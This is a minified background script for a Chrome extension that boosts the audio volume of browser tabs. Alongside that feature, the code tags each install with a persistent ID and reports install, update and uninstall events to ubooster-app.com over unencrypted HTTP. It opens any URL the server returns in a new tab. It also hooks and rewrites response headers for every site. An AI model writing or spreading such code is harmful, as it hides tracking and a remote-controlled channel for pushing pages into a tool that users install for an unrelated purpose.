class Background{constructor(){this.actionUrl="http://ubooster-app.com/api/action/",this.uninstallUrl="http://ubooster-app.com/uninstall/",this.config={},this.queue=[],this.queueProcessorReady=!1,this.uid="",this.version=chrome.runtime.getManifest().version,this.tabsData={},this.run()}run(){this.initStorage(),this.setUninstallUrl(),this.initListeners()}initStorage(){chrome.storage.local.get(b=>{b&&b.config&&(this.config=b.config),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),this.queueProcessorReady=!0,this.processQueue()})}setUninstallUrl(){const b="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+b)}initListeners(){this.initInstallListeners(),this.initMessageListeners(),this.initTabRemoveListeners(),this.initWebRequestListeners()}initInstallListeners(){chrome.runtime.onInstalled.addListener(b=>{this.queue.push({type:"action",action:b.reason}),this.queueProcessorReady&&this.processQueue()})}initMessageListeners(){chrome.runtime.onMessage.addListener((d,a,b)=>{switch(d.action){case"popup__get-gain-value":this.sendTabGainValue(d.tabId,b);break;case"popup__tab-gain-change":this.handleTabGainChange(d.tabId,d.gainValue),b("");break;default:}return!0})}initTabRemoveListeners(){chrome.tabs.onRemoved.addListener(b=>{this.tabsData.hasOwnProperty(b)&&this.tabsData[b].audioContext.close().then(()=>{delete this.tabsData[b]})})}initWebRequestListeners(){chrome.webRequest.onHeadersReceived.addListener(({responseHeaders:c})=>{let d=[];return c.forEach(b=>{d.push(b)}),{responseHeaders:d}},{urls:["*://*/*"]},["blocking","responseHeaders"])}processQueue(){for(;0<this.queue.length;){var c=this.queue.shift();if(!c.type||"action"!=c.type)return!0;var a="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:c.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+a).then(b=>b.json()).then(function(b){b.url&&chrome.tabs.create({url:b.url})})}}saveConfig(){chrome.storage.local.set({config:this.config})}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(d){var a=0|16*Math.random(),b="x"==d?a:8|3&a;return b.toString(16)})}sendTabGainValue(e,a){let b=null;const f=this.tabsData.hasOwnProperty(e);f&&(b=this.tabsData[e].gainNode.gain.value),a({gainValue:b})}handleTabGainChange(d,a){const b=this.tabsData.hasOwnProperty(d);b?(this.setGain(d,a),this.updateBadge(d,a)):chrome.tabCapture.capture({audio:!0,video:!1},b=>{chrome.runtime.lastError||(this.createTabData(d,b),this.setGain(d,a),this.updateBadge(d,a))})}setGain(c,a){this.tabsData[c].gainNode.gain.value=a/100}updateBadge(c,a){chrome.browserAction.setBadgeText({text:`${a}`,tabId:c})}createTabData(f,a){const b=new AudioContext,c=b.createMediaStreamSource(a),d=b.createGain();c.connect(d),d.connect(b.destination),this.tabsData[f]={audioContext:b,gainNode:d}}}const background=new Background;